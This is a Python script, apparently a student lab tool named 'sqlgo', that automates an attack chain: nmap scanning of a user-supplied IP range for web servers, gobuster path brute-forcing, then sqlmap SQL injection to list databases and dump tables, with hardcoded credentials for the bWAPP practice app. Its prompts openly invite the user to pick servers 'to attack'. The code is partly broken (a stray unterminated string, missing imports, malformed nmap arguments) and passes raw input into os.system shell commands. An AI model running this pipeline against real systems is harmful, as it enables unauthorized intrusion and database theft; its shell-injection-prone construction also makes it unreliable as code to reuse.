#!/usr/bin/env python

import os
import nmap

if os.geteuid() != 0:
    print("\nYou must run this script as a root user.\n")

    # should delete following reponse/if statement later
    response = input("Continue anyway for script testing purposes? y/n ")
    if response != "y":
        exit(0)



def nmap_scan():
    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")    
	
    nm = nmap.PortScanner()
    nm.scan(hosts = ip_addr, arguments = '--open -n -sV-p80,443')
    num = 0
    
    #exit if nothing scanned
    if  len(nm.all_hosts()) == 0:
        sys.exit(0)

    for host in nm.all_hosts():
        num+= 1
        print ('---------------------------')
        print ([num] ,host, '- state:', nm[host].state())
        print ('port 135:', nm[host]['tcp'][135]['state'],'port 139:', nm[host]['tcp'][139]['state'])
    print()
    
    print('Now, lets look for hidden paths in the webserver that could be exploitable')    
    temp = int(input('Type the number of the IP that you would like to attack ')) - 1
    
    webserver = nm.all_hosts()[temp]
    print(webserver)
    return webserver
"""




def nmap_scan():
    ip_addr = input("\nLet's look for some web servers to attack! \nType in the IP range you would like to scan: ")
    cmd = "nmap -n --open " + ip_addr + " -p80,443  -sV > /usr/share/sqlgo/nmapoutput.txt"
    try:
        os.system(cmd)
        parseNmapOutput()
        #we should probably parse nmap output to see if there were zero hosts that were found
        #if no hosts were found, give the option to run nmap scan again.

    except KeyboardInterrupt:
        print ("nmap scan failed. Run script again.")
    
    #ask user to input a website from the nmap command output. Maybe do a check to ensure that whatever they put was output from the nmap command?
    webserver = input("\nNow, let's look for hidden paths in the webserver that could be exploitable!\nType in the webserver you would like to attack: ")
    return webserver

def parseNmapOutput():
    s = open("/usr/share/sqlgo/nmapoutput.txt", "r")
    count = 0
    line_iter = iter(s)

    for line in line_iter:
        count += 1
        flag = True
        if "Nmap scan report for " in line:
            arr = line.split()
            print(arr[-1])
 
        if "Host is up " not in line and len(line) != 1 and "Not shown" not in line and "Nmap" not in line and "Service" not in line:
            print(line)
    if count == 2 or count == 3:
        result = "No hosts found."
        return result
"""
    


def gobuster(webserver):
    #OS MKDIR TO INCLUDE OUR FOLDER FOR THIS APPLICATION
    cmd = "gobuster -o gobust.txt -u " + webserver + " -w /usr/share/wordlists/dirb/common.txt"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("Gobuster failed. Run script again")

def inject_options_output():
    options = ["Exploit vulnerable input parameters", "Exploit form-based SQL Injection"]
    print("\nWhich option would you like to use in SQLMap?\n")
    counter = 1
    for option in options:
        print(counter, option, "\n")
        counter += 1
    print("\nPlease type the corresponding type number: ")

def sqlmap(webserver):

    option2 = " "
    if(webserver == "10.0.2.15/bWAPP"):
        os.system("wget --save-cookies /usr/share/sqlgo/cookies.txt --keep-session-cookies  --post-data 'login=bee&password=bug&security_level=0&form=submit'      http://10.0.2.15/bWAPP/login.php 1>wget.txt 2>wget.txt")
        cookie = parseCookie()
        option2 = "--cookie=\"PHPSESSID=" + cookie + ";security_level=0\" " + " --data=\"login=test&password=test&form=submit\""

    injection_options = ["?id=1&Submit=Submit#\"", option2]
    hidden_path = input("What hidden path would you like to SQL inject? ")
    inject_options_output()
    option_chosen = int(input())

    if option_chosen == 1:
        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "/" + injection_options[0]

    if option_chosen == 2:
        base_cmd = "sqlmap -u " + "\"http://" + webserver + hidden_path + "\" " + injection_options[1] 

    cmd = base_cmd + " --dbs"

    print(cmd)    
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap failed. Run script again")
    return base_cmd


def parseCookie():
    s = open("/usr/share/sqlgo/cookies.txt", "r")
    line_iter = iter(s)
    for line in line_iter:
        if "PHPSESSID" in line:
            arr = line.split()
            cookie = arr[-1]
            return cookie
            

def database_search(base_cmd):
    database = input("Let's look inside the databases. We will start by displaying its tables. \nChoose a database to assess: ")
    cmd = base_cmd + " -D " + database +  " --tables"
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database failed. Run script again")
    return database

def table_dump(base_cmd, database):
    table = input("Let's look inside the tables. Choose a table to display its contents: ")
    cmd = base_cmd + " --dump -D " + database +  " -T " + table
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print ("SQLMap - search for database table failed. Run script again")

def intro():
    ascii_title =  "____   __   __       ___   __  \n/ ___) /  \ (  )     / __) /  \ \n\___ \(  O )/ (_/\  ( (_ \(  O )\n(____/ \__\)\____/   \___/ \__/      \n\n"
    print(ascii_title)
    response = input("Type 'info' for information, anything else to continue to application: ") 
    return response

def info():
    print("This tool:\n1) pings the desired network range for live hosts,\n2) scans for ports 80, 443 for web servers,\n3) uses Gobuster to show any hidden files and directories,\n4) tries to perform SQLMap on those hidden web pages if they contain forms or any kind of user input.")
    response = input("Type 'c' to continue to application, anything else to quit: ")
    if response == "c":
        execute_sqlgo()
    else:
        exit(0)

def execute_sqlgo():
    if(os.path.exists('/usr/share/sqlgo/')): #clears folder if it exists to avoid having information from two seperate application runs
        cmd = "rm -r /usr/share/sqlgo"
        try:
            os.system(cmd)
        except KeyboardInterrupt:
            print ("Deleting folder failed - fix this")
    os.mkdir('/usr/share/sqlgo')

    webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
    gobuster(webserver)
    base_cmd = sqlmap(webserver)
    database = database_search(base_cmd)
    table_dump(base_cmd, database)

if __name__ == "__main__":
    response = intro()
    if response == "info":
        info()
    else:
        execute_sqlgo()
